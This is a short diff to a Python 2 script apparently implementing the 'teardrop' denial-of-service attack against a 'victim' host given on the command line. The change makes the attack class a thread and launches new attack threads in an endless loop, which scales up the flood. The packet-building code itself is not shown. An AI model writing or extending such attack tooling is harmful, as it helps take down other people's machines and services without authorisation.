@@ -10,7 +10,7 @@ if len(sys.argv) != 2:
 victim = sys.argv[1]
 sys.tracebacklimit=0
 
-class teardrop:
+class teardrop(threading.Thread):
 	try:
 		def check(self):
 			global target,victim
@@ -58,6 +58,6 @@ class teardrop:
 		print 'Victim not available or there is some error with your IP!'
 		sys.exit(1)
 
-tear = teardrop()
+
 while True:
-	tear.drop()
+	teardrop().start()
